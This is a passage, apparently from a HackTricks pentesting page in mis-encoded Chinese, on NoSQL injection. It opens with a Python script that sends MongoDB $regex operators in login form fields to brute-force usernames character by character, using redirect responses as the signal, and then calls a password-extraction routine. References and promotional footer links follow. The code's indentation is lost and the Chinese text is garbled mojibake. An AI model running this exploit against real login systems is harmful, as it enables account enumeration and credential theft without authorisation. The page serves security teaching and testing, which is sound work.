params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
for c in possible_chars:
username = "^" + c
params["username[$regex]"] = username + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
print("Found username starting with "+c)
while True:
for c2 in possible_chars:
params["username[$regex]"] = username + c2 + ".*"
if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
username += c2
print(username)
break

if c2 == possible_chars[-1]:
print("Found username: "+username[1:])
usernames.append(username[1:])
break
return usernames


for u in get_usernames():
get_password(u)
```
## å‚è€ƒèµ„æ–™

* [https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTricksçš„è¡£ç‰©**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
